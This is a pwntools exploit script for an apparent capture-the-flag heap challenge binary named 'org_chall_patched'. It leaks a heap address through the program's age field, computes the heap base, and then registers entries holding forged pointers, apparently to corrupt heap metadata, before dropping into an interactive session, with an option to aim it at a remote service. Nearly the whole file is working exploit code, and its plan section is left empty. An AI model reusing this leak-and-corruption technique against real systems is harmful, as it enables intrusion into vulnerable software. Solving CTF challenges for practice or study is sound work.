#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("org_chall_patched")

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses

# Functions
def register(age: bytes, name: bytes, description: bytes):
    io.sendline(b"1")
    io.sendlineafter(b"hacker? ", age)
    io.sendlineafter(b"name ? ", name)
    io.sendlineafter(b"hacker ? ", description)
    io.recvuntil(b">> ")

def view(index: int):
    io.sendline(b"2")
    io.sendlineafter(b"number ? ", str(index).encode())
    io.recvuntil(b"Age: ")
    leak = io.recvline().strip()
    io.recvline()
    return leak

io = start()

register(b"+", b"A"*16, b"B"*16) # 0
register(b"+", b"A"*16, b"B"*16) # 1

heap_leak = view(1)
heap_leak = int(heap_leak, 10) # Base 10 since we get it as a decimal (base 10, hex is base 16)
log.info("Heap leak: %s" % hex(heap_leak))
heap_base = heap_leak - 0xe0 # The offset of the chunk from heap base
log.info("Heap base %s" % hex(heap_base))

register(b"100", b"A"*16, b"A"*16 + p64(heap_base+0x100) + b"C"*8)
register(b"+", b"C"*16, b"D"*32) # 
register(str(heap_base+0x100).encode(), b"E"*16, b"F"*32) #
register(str(heap_base+0x48).encode(), b"A"*16, b"B"*32) #
register(b"+", b"C"*16, b"D"*32) # 





io.interactive()
